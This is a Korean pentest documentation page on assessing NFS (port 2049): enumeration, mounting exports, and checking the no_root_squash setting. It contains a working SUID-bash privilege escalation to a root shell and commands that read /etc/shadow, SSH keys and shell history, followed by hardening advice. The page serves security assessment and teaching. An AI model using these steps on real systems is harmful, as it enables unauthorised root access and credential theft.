---
sidebar_position: 6
title: NFS (Port 2049)
---

# NFS 취약점 진단 (포트 2049)

## 개요

**NFS (Network File System)**: 네트워크를 통한 파일 및 디렉토리 공유 프로토콜

**주요 포트**:
- **111/TCP,UDP**: RPC Portmapper (NFS 서비스 위치 정보)
- **2049/TCP,UDP**: NFS 서버 (실제 데이터 전송)

**주요 사용 환경**: Linux/Unix 서버

---

## 취약점 진단 체크리스트

### 1. Export 접근 제어
- 어떤 디렉토리가 공유되어 있는가
- 어떤 IP/네트워크에서 접근 가능한가

### 2. 파일 권한
- 읽기 권한: 민감 정보 유출
- 쓰기 권한: 악성 파일 업로드

### 3. No_Root_Squash 설정
클라이언트의 root 권한을 유지하는 설정 (취약)

### 4. NFSv3 vs NFSv4
- NFSv3: 인증 없음 (취약)
- NFSv4: Kerberos 인증 지원

---

## 정보 수집

### Nmap 스캔

```bash
# 기본 스캔
nmap -p 111,2049 -sV <target>

# NSE 스크립트 포함
nmap -p 111,2049 -sV --script="nfs-*" <target>

# RPC 정보 확인
nmap -p 111 --script rpcinfo <target>

# 예시
nmap -p 111,2049 -sV --script="nfs-*" 192.168.1.10
```

### Showmount로 Export 확인

```bash
# Export 목록 확인
showmount -e <target>

# 예시
showmount -e 192.168.1.10

# 출력 예시:
# Export list for 192.168.1.10:
# /home          192.168.1.0/24
# /var/nfs/share *
# /backup        192.168.1.50
```

**출력 해석**:
- `/home`: 192.168.1.0/24 네트워크에서만 접근 가능
- `/var/nfs/share`: 모든 IP에서 접근 가능 (`*`)
- `/backup`: 특정 IP(192.168.1.50)에서만 접근

### RPC 정보 수집

```bash
# RPC 서비스 확인
rpcinfo -p <target>

# 예시
rpcinfo -p 192.168.1.10

# 출력:
#    program vers proto   port  service
#     100000    4   tcp    111  portmapper
#     100003    3   tcp   2049  nfs
#     100005    3   tcp   2050  mountd
```

---

## NFS 마운트 및 탐색

### 마운트

```bash
# 1. 마운트 포인트 생성
sudo mkdir /mnt/nfs-share

# 2. NFS 마운트
sudo mount -t nfs <target>:<export> /mnt/nfs-share

# 예시
sudo mount -t nfs 192.168.1.10:/home /mnt/nfs-share

# NFSv3 강제 (호환성)
sudo mount -t nfs -o vers=3 <target>:<export> /mnt/nfs-share

# 읽기 전용 마운트
sudo mount -t nfs -o ro <target>:<export> /mnt/nfs-share
```

### 파일 및 권한 확인

```bash
# 마운트된 디렉토리로 이동
cd /mnt/nfs-share

# 파일 목록 및 권한 확인
ls -la

# 출력 예시:
# drwxr-xr-x  3 root   root   4096 Jan 10 10:00 .
# drwxrwxrwx  2 nobody nogroup 4096 Jan 10 10:00 uploads
# -rw-r--r--  1 user   user   1024 Jan 10 10:00 config.txt

# 파일 읽기 시도
cat config.txt

# 파일 쓰기 시도
touch test.txt
```

### 언마운트

```bash
# 마운트 디렉토리에서 나가기
cd ~

# 언마운트
sudo umount /mnt/nfs-share

# 강제 언마운트 (필요 시)
sudo umount -f /mnt/nfs-share
```

---

## No_Root_Squash 취약점

### 개념

**Root Squash**: 클라이언트의 root(UID 0)를 서버의 nobody(UID 65534)로 변환 (기본 설정, 안전)

**No_Root_Squash**: 클라이언트의 root 권한을 그대로 유지 (취약)

### 확인 방법

```bash
# 1. Root로 파일 생성
sudo touch /mnt/nfs-share/test-root-file

# 2. 파일 소유자 확인
ls -la /mnt/nfs-share/test-root-file

# No_Root_Squash 활성화 (취약):
# -rw-r--r-- 1 root root 0 Jan 10 10:00 test-root-file

# Root Squash 활성화 (안전):
# -rw-r--r-- 1 nobody nogroup 0 Jan 10 10:00 test-root-file
```

### 권한 상승 공격 (No_Root_Squash 활용)

**시나리오**: No_Root_Squash가 활성화된 NFS를 통한 권한 상승

**공격 단계**:

```bash
# 1. 공격자 머신에서 SUID bash 생성
cp /bin/bash /mnt/nfs-share/bash

# 2. SUID 비트 설정 (root 권한 필요)
sudo chmod +s /mnt/nfs-share/bash

# 3. 권한 확인
ls -la /mnt/nfs-share/bash
# -rwsr-sr-x 1 root root 1183448 Jan 10 10:00 bash

# 4. 대상 호스트에서 (낮은 권한 사용자)
# NFS 공유 디렉토리로 이동
cd /nfs-mount/
ls -la bash
# -rwsr-sr-x 1 root root 1183448 Jan 10 10:00 bash

# 5. SUID bash 실행
./bash -p

# 6. 권한 확인
id
# uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)

# Root 쉘 획득!
whoami
# root
```

**플래그 설명**:
- `-p`: Privileged mode (SUID 권한 유지)

---

## 민감 정보 수집

NFS 공유에서 찾을 수 있는 민감 정보:

```bash
# SSH 키
find /mnt/nfs-share -name "id_rsa*" 2>/dev/null
find /mnt/nfs-share -name ".ssh" 2>/dev/null

# 설정 파일
find /mnt/nfs-share -name "*.conf" 2>/dev/null
find /mnt/nfs-share -name "config*" 2>/dev/null

# 백업 파일
find /mnt/nfs-share -name "*.bak" 2>/dev/null
find /mnt/nfs-share -name "*.backup" 2>/dev/null

# 비밀번호 파일
cat /mnt/nfs-share/etc/shadow 2>/dev/null
cat /mnt/nfs-share/home/*/.bash_history 2>/dev/null
```

---

## /etc/exports 파일

NFS 서버의 Export 설정 파일:

```bash
# 파일 위치
/etc/exports

# 예시 내용:
/home          192.168.1.0/24(rw,sync,no_subtree_check)
/var/nfs/share *(rw,sync,no_root_squash)
/backup        192.168.1.50(ro,sync,root_squash)
```

**주요 옵션**:
- `rw`: 읽기/쓰기
- `ro`: 읽기 전용
- `sync`: 동기 쓰기
- `no_root_squash`: Root 권한 유지 (취약)
- `root_squash`: Root를 nobody로 변환 (기본, 안전)
- `no_subtree_check`: 성능 향상
- `*`: 모든 IP 허용

---

## 주요 명령어 요약

```bash
# 스캔
nmap -p 111,2049 -sV --script="nfs-*" <target>

# Export 확인
showmount -e <target>

# RPC 정보
rpcinfo -p <target>

# 마운트
sudo mount -t nfs <target>:<export> /mnt/share

# 파일 확인
ls -la /mnt/share

# No_Root_Squash 테스트
sudo touch /mnt/share/test
ls -la /mnt/share/test

# 언마운트
sudo umount /mnt/share

# SUID bash 생성 (권한 상승)
sudo cp /bin/bash /mnt/share/bash
sudo chmod +s /mnt/share/bash
```

## 보안 권장사항

1. ✅ 불필요한 Export 제거
2. ✅ IP/네트워크 제한 (`*` 사용 금지)
3. ✅ Root_Squash 활성화 (No_Root_Squash 비활성화)
4. ✅ 읽기 전용(`ro`) 우선 사용
5. ✅ NFSv4 + Kerberos 인증 사용
6. ✅ 방화벽으로 포트 111, 2049 제한
7. ✅ 정기적인 권한 감사
